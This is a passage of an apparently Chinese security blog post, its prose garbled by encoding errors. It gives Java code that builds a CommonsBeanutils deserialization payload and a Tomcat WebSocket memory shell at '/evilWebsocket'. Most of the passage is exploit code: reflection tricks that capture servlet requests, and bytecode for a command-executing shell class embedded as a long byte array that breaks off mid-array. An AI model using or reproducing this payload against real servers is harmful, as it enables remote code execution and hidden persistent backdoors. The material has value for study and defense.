class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Field <span class="title function_">getField</span><span class="params">(<span class="keyword">final</span> Class&lt;?&gt; clazz, <span class="keyword">final</span> String fieldName)</span> &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            field = clazz.getDeclaredField(fieldName);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (NoSuchFieldException ex) &#123;</span><br><span class="line">            <span class="keyword">if</span> (clazz.getSuperclass() != <span class="literal">null</span>)</span><br><span class="line">                field = getField(clazz.getSuperclass(), fieldName);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> field;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getpayload</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;</span><br><span class="line">                ClassPool.getDefault().get(WebsocketTemplatesImpl.class.getName()).toBytecode()</span><br><span class="line">        &#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> <span class="type">BeanComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>();</span><br><span class="line">        <span class="keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;Object&gt;(<span class="number">2</span>, comparator);</span><br><span class="line">        <span class="comment">// stub data for replacement later</span></span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        setFieldValue(comparator, <span class="string">&quot;property&quot;</span>, <span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line">        setFieldValue(queue, <span class="string">&quot;queue&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;obj, obj&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> queue;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@org</span>.junit.Test</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test1</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">payload</span> <span class="operator">=</span> getpayload();</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        outputStream.writeObject(payload);</span><br><span class="line">        outputStream.flush();</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">codes</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());</span><br><span class="line">        System.out.println(codes);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@org</span>.junit.Test</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test2</span><span class="params">()</span><span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">byte</span>[] bytes = ClassPool.getDefault().get(EvilWebsocket.class.getName()).toBytecode();</span><br><span class="line">        System.out.println(Arrays.toString(bytes));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œtest2è·å–åˆ°EvilWebsocketç±»çš„å­—èŠ‚ç ï¼Œä¹‹åæ›´æ”¹ ä¸‹é¢WebsocketTemplatesImplç±»ä¸­çš„byteså³å¯ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.ApplicationFilterChain;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.StandardContext;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.loader.WebappClassLoaderBase;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.webresources.StandardRoot;</span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.websocket.server.WsServerContainer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletContext;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletResponse;</span><br><span class="line"><span class="keyword">import</span> javax.websocket.*;</span><br><span class="line"><span class="keyword">import</span> javax.websocket.server.ServerContainer;</span><br><span class="line"><span class="keyword">import</span> javax.websocket.server.ServerEndpointConfig;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Modifier;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WebsocketTemplatesImpl</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFinalStatic</span><span class="params">(Field field)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">modifiersField</span> <span class="operator">=</span> Field.class.getDeclaredField(<span class="string">&quot;modifiers&quot;</span>);</span><br><span class="line">        modifiersField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        modifiersField.setInt(field, field.getModifiers() &amp; ~Modifier.FINAL);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">urlPath</span> <span class="operator">=</span> <span class="string">&quot;/evilWebsocket&quot;</span>;</span><br><span class="line">            <span class="type">Field</span> <span class="variable">WRAP_SAME_OBJECT_FIELD</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationDispatcher&quot;</span>).getDeclaredField(<span class="string">&quot;WRAP_SAME_OBJECT&quot;</span>);</span><br><span class="line">            <span class="type">Field</span> <span class="variable">lastServicedRequestField</span> <span class="operator">=</span> ApplicationFilterChain.class.getDeclaredField(<span class="string">&quot;lastServicedRequest&quot;</span>);</span><br><span class="line">            <span class="type">Field</span> <span class="variable">lastServicedResponseField</span> <span class="operator">=</span> ApplicationFilterChain.class.getDeclaredField(<span class="string">&quot;lastServicedResponse&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//ä¿®æ”¹static final</span></span><br><span class="line">            setFinalStatic(WRAP_SAME_OBJECT_FIELD);</span><br><span class="line">            setFinalStatic(lastServicedRequestField);</span><br><span class="line">            setFinalStatic(lastServicedResponseField);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//é™æ€å˜é‡ç›´æ¥å¡«nullå³å¯</span></span><br><span class="line">            ThreadLocal&lt;ServletRequest&gt; lastServicedRequest = (ThreadLocal&lt;ServletRequest&gt;) lastServicedRequestField.get(<span class="literal">null</span>);</span><br><span class="line">            ThreadLocal&lt;ServletResponse&gt; lastServicedResponse = (ThreadLocal&lt;ServletResponse&gt;) lastServicedResponseField.get(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (!WRAP_SAME_OBJECT_FIELD.getBoolean(<span class="literal">null</span>) || lastServicedRequest == <span class="literal">null</span> || lastServicedResponse == <span class="literal">null</span>)&#123;</span><br><span class="line">                WRAP_SAME_OBJECT_FIELD.setBoolean(<span class="literal">null</span>,<span class="literal">true</span>);</span><br><span class="line">                lastServicedRequestField.set(<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">ThreadLocal</span>());</span><br><span class="line">                lastServicedResponseField.set(<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">ThreadLocal</span>());</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="type">ServletRequest</span> <span class="variable">servletRequest</span> <span class="operator">=</span> lastServicedRequest.get();</span><br><span class="line">                <span class="type">ServletResponse</span> <span class="variable">servletResponse</span> <span class="operator">=</span> lastServicedResponse.get();</span><br><span class="line"></span><br><span class="line">                <span class="comment">//å¼€å§‹æ³¨å…¥å†…å­˜é©¬</span></span><br><span class="line">                <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> servletRequest.getServletContext();</span><br><span class="line">                <span class="type">ClassLoader</span> <span class="variable">cl</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader();</span><br><span class="line">                Class clazz;</span><br><span class="line">                <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;-<span class="number">54</span>, -<span class="number">2</span>, -<span class="number">70</span>, -<span class="number">66</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">52</span>, <span class="number">0</span>, -<span class="number">110</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">30</span>, <span class="number">0</span>, <span class="number">75</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">76</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">77</span>, <span class="number">0</span>, <span class="number">78</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">79</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">80</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">81</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">82</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">83</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">84</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">85</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">86</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">87</span>, <span class="number">0</span>, <span class="number">88</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">87</span>, <span class="number">0</span>, <span class="number">89</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">90</span>, <span class="number">0</span>, <span class="number">91</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">92</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">93</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">94</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">95</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">96</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">97</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">98</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">29</span>, <span class="number">0</span>, <span class="number">99</span>, <span class="number">11</span>, <span class="number">0</span>, <span class="number">100</span>, <span class="number">0</span>, <span class="number">101</span>, <span class="number">11</span>, <span class="number">0</span>, <span class="number">102</span>, <span class="number">0</span>, <span class="number">103</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">104</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">25</span>, <span class="number">0</span>, <span class="number">105</span>, <span class="number">11</span>, <span class="number">0</span>, <span class="number">100</span>, <span class="number">0</span>, <span class="number">106</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">29</span>, <span class="number">0</span>, <span class="number">107</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">108</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">109</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">111</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">115</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">115</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">110</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">25</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">120</span>, <span class="number">47</span>, <span class="number">119</span>, <span class="number">101</span>, <span class="number">98</span>, <span class="number">115</span>, <span class="number">111</span>, <span class="number">99</span>, <span class="number">107</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">115</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">110</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">60</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">105</span>, <span class="number">116</span>, <span class="number">62</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">40</span>, <span class="number">41</span>, <span class="number">86</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">67</span>, <span class="number">111</span>, <span class="number">100</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">76</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">101</span>, <span class="number">78</span>, <span class="number">117</span>, <span class="number">109</span>, <span class="number">98</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">84</span>, <span class="number">97</span>, <span class="number">98</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">18</span>, <span class="number">76</span>, <span class="number">111</span>, <span class="number">99</span>, <span class="number">97</span>, <span class="number">108</span>, <span class="number">86</span>, <span class="number">97</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">97</span>, <span class="number">98</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">84</span>, <span class="number">97</span>, <span class="number">98</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">116</span>, <span class="number">104</span>, <span class="number">105</span>, <span class="number">115</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">76</span>, <span class="number">69</span>, <span class="number">118</span>, <span class="number">105</span>, <span class="number">108</span>, <span class="number">87</span>, <span class="number">101</span>, <span class="number">98</span>, <span class="number">115</span>, <span class="number">111</span>, <span class="number">99</span>, <span class="number">107</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">111</span>, <span class="number">110</span>, <span class="number">77</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">115</span>, <span class="number">97</span>, <span class="number">103</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">21</span>, <span class="number">40</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">59</span>, <span class="number">41</span>, <span class="number">86</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">105</span>, <span class="number">115</span>, <span class="number">76</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">117</span>, <span class="number">120</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">90</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">111</span>, <span class="number">115</span>, <span class="number">84</span>, <span class="number">121</span>, <span class="number">112</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">18</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">99</span>, <span class="number">109</span>, <span class="number">100</span>, <span class="number">115</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">19</span>, <span class="number">91</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">21</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">47</span>, <span class="number">73</span>, <span class="number">110</span>, <span class="number">112</span>, <span class="number">117</span>, <span class="number">116</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">101</span>, <span class="number">97</span>, <span class="number">109</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">115</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">19</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">117</span>, <span class="number">116</span>, <span class="number">105</span>, <span class="number">108</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">99</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">110</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">111</span>, <span class="number">117</span>, <span class="number">116</span>, <span class="number">112</span>, <span class="number">117</span>, <span class="number">116</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">101</span>, <span class="number">120</span>, <span class="number">99</span>, <span class="number">101</span>, <span class="number">112</span>, <span class="number">116</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">110</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">21</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">99</span>, <span class="number">101</span>, <span class="number">112</span>, <span class="number">116</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">110</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">99</span>, <span class="number">111</span>, <span class="number">109</span>, <span class="number">109</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">100</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">13</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">97</span>, <span class="number">99</span>, <span class="number">107</span>, <span class="number">77</span>, <span class="number">97</span>, <span class="number">112</span>, <span class="number">84</span>, <span class="number">97</span>, <span class="number">98</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">82</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">48</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">112</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">92</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">108</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">104</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">111</span>, <span class="number">110</span>, <span class="number">79</span>, <span class="number">112</span>, <span class="number">101</span>, <span class="number">110</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">60</span>, <span class="number">40</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">120</span>, <span class="number">47</span>, <span class="number">119</span>, <span class="number">101</span>, <span class="number">98</span>, <span class="number">115</span>, <span class="number">111</span>, <span class="number">99</span>, <span class="number">107</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">115</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">110</span>, <span class="number">59</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">120</span>, <span class="number">47</span>, <span class="number">119</span>, <span class="number">101</span>, <span class="number">98</span>, <span class="number">115</span>, <span class="number">111</span>, <span class="number">99</span>, <span class="number">107</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">47</span>, <span class="number">69</span>, <span class="number">110</span>, <span class="number">100</span>, <span class="number">112</span>, <span class="number">111</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">116</span>, <span class="number">67</span>, <span class="number">111</span>, <span class="number">110</span>, <span class="number">102</span>, <span class="number">105</span>, <span class="number">103</span>, <span class="number">59</span>, <span class="number">41</span>, <span class="number">86</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">99</span>, <span class="number">111</span>, <span class="number">110</span>, <span class="number">102</span>, <span class="number">105</span>, <span class="number">103</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">32</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">120</span>, <span class="number">47</span>, <span class="number">119</span>, <span class="number">101</span>, <span class="number">98</span>, <span class="number">115</span>, <span class="number">111</span>, <span class="number">99</span>, <span class="number">107</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">47</span>, <span class="number">69</span>, <span class="number">110</span>, <span class="number">100</span>, <span class="number">112</span>, <span class="number">111</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">116</span>, <span class="number">67</span>, <span class="number">111</span>, <span class="number">110</span>, <span class="number">102</span>, <span class="number">105</span>, <span class="number">103</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">21</span>, <span class="number">40</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">79</span>, <span class="number">98</span>, <span class="number">106</span>, <span class="number">101</span>, <span class="number">99</span>, <span class="number">116</span>, <span class="number">59</span>, <span class="number">41</span>, <span class="number">86</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">83</span>, <span class="number">105</span>, <span class="number">103</span>, <span class="number">110</span>, <span class="number">97</span>, <span class="number">116</span>, <span class="number">117</span>, <span class="number">114</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">87</span>, <span class="number">104</span>, <span class="number">111</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">73</span>, <span class="number">110</span>, <span class="number">110</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">67</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">115</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">84</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">120</span>, <span class="number">47</span>, <span class="number">119</span>, <span class="number">101</span>, <span class="number">98</span>, <span class="number">115</span>, <span class="number">111</span>, <span class="number">99</span>, <span class="number">107</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">47</span>, <span class="number">69</span>, <span class="number">110</span>, <span class="number">100</span>, <span class="number">112</span>, <span class="number">111</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">116</span>, <span class="number">59</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">120</span>, <span class="number">47</span>, <span class="number">119</span>, <span class="number">101</span>, <span class="number">98</span>, <span class="number">115</span>, <span class="number">111</span>, <span class="number">99</span>, <span class="number">107</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">47</span>, <span class="number">77</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">115</span>, <span class="number">97</span>, <span class="number">103</span>, <span class="number">101</span>, <span class="number">72</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">100</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">36</span>, <span class="number">87</span>, <span class="number">104</span>, <span class="number">111</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">60</span>, <span class="number">76</span>, <span 